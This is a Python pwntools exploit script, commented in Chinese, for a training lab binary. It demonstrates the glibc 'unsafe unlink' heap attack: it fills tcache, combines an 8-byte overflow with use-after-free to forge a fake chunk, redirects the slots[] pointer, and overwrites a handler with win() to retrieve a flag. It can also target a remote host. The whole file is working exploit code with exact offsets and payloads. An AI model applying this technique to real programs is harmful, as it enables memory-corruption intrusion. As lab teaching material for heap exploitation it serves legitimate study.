#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_unsafe_unlink —— unsafe unlink 参考 exploit（glibc 2.43）

漏洞：edit(i) 多写 8 字节（sizes[i] + 8），正好盖掉 next chunk 的 size；
      del 不清 slots[]/sizes[] → UAF。

利用：
  16 个 0xf8 块填满 tcache[0x100]（否则 free(a) 进 tcache，不会走 unlink）
  a=slot16, b=slot17, c=slot18（三个相邻 0x100 chunk）
  free(a)  → a 进 unsorted bin（tcache 已满）
  edit(16, a->fd=&slots[0]-0x18, a->bk=&slots[0]-0x10,
           b.prev_size=0x100, b.size=0x100(清 PREV_INUSE))
  free(b)  → !prev_inuse(b) → 向前合并 → unlink(a)
             (chunksize(a)==0x100==prev_size ✓, FD->bk==BK->fd==slots[0]==a ✓)
             → slots[0] = FD = &slots[0] - 0x18
  之后 edit(16) 写的就是 &slots[0]-0x18：把 slots[0] 自己改成 &handlers，
  再 edit(16, p64(win)) 就写到 handlers[0]，trigger(0) 拿 flag。

用法：
    cd labs/lab_unsafe_unlink
    make
    printf '__PWNED__{unlink_ok}\\n' > flag.txt
    python exp.py
    HOST=127.0.0.1 PORT=9999 python exp.py     # 远程（socat 起服务）
"""
import os
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./chal"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
SZ = 0xF8          # 请求 0xf8 → chunk 0x100
FILL = 16          # host glibc 2.43 的 tcache 每个 bin 上限是 16（实测）


def start():
    if HOST:
        return remote(HOST, PORT)
    # ERRLOG=<file> 时把子进程 stderr 落盘，方便看 glibc 的 malloc_printerr 原文
    err = os.getenv("ERRLOG")
    return process(BIN, stderr=open(err, "wb") if err else None)


def add(p, idx, size, data):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)


def edit(p, idx, data):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendafter(b"data: ", data)
    p.recvuntil(b"done")


def free(p, idx):
    p.sendlineafter(b"choice: ", b"4")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.recvuntil(b"done")


def show(p, idx, n):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.recvuntil(b"data: ")
    out = p.recvn(n)
    p.recvline()
    return out


def trigger(p, idx):
    p.sendlineafter(b"choice: ", b"5")
    p.sendlineafter(b"index: ", str(idx).encode())


def exploit():
    e = ELF(BIN, checksec=False)
    slots = e.symbols["slots"]
    handlers = e.symbols["handlers"]
    win = e.symbols["win"]
    FD = slots - 0x18
    BK = slots - 0x10
    log.info("slots = %#x, handlers = %#x, win = %#x", slots, handlers, win)
    log.info("FD = %#x, BK = %#x", FD, BK)

    p = start()

    # 1) a/b/c 必须放在 slot 0/1/2：fake chunk 的 FD/BK 锚在 slots[0]，
    #    unlink 检查 FD->bk == P 要求 slots[0] 正好存着 a 的 user 指针。
    A, B, C = 0, 1, 2
    add(p, A, SZ, b"A" * SZ)
    add(p, B, SZ, b"B" * SZ)
    add(p, C, SZ, b"C" * SZ)
    for i in range(3, 3 + FILL):
        add(p, i, SZ, b"F" * SZ)

    # 2) 填满 tcache[0x100]，这样 free(a) 才会进 unsorted bin
    for i in range(3, 3 + FILL):
        free(p, i)
    free(p, A)

    # 3) UAF + 8 字节溢出。
    #    关键偏移：unlink 的 P 是 chunk 头，而 slots[] 里存的是 user 指针，
    #    所以把伪块 P 设成 a.user 本身（prev_size = 0xf0）：
    #      P        = b - 0xf0 = a.user
    #      P->size  = a.user[0x08:0x10] = 0xf0   ← 必须等于 prev_size
    #      P->fd    = a.user[0x10:0x18] = FD
    #      P->bk    = a.user[0x18:0x20] = BK
    #    FD->bk = *(FD+0x18) = slots[0] = a.user = P ✓
    #    BK->fd = *(BK+0x10) = slots[0] = P        ✓
    #    另外 b.prev_size = 0xf0，b.size = 0x100（清掉 PREV_INUSE）。
    payload = (
        p64(0)                             # a.user[0x00:0x08]（原 unsorted fd）
        + p64(0xF0)                        # a.user[0x08:0x10] = P->size
        + p64(FD)                          # a.user[0x10:0x18] = P->fd
        + p64(BK)                          # a.user[0x18:0x20] = P->bk
        + b"A" * 0xD0                      # 填充
        + p64(0xF0)                        # a.user[0xf0:0xf8] = b.prev_size
        + p64(0x100)                       # a.user[0xf8:0x100] = b.size
    )
    assert len(payload) == 0x100
    edit(p, A, payload)

    # 4) free(b) → 向前合并 → unlink(a) → slots[0] 被写成 FD
    free(p, B)

    # 5) 现在 slots[0] == &slots[0] - 0x18：先把 slots[0] 自己改成 &handlers
    edit(p, A, (b"\x00" * 0x18 + p64(handlers)).ljust(0x100, b"\x00"))

    # 6) 再写一次，这次目标是 handlers[] → handlers[0] = win
    edit(p, A, p64(win).ljust(0x100, b"\x00"))

    trigger(p, 0)
    p.recvuntil(b"here is your flag:")
    return p.recvall(timeout=5)


if __name__ == "__main__":
    out = exploit()
    sys.stdout.buffer.write(out)
    sys.stdout.write("\n" if not out.endswith(b"\n") else "")
    if b"__PWNED__" not in out:
        raise SystemExit("[-] 没拿到 flag，检查 labs/lab_unsafe_unlink/flag.txt")
    log.success("unsafe unlink OK")
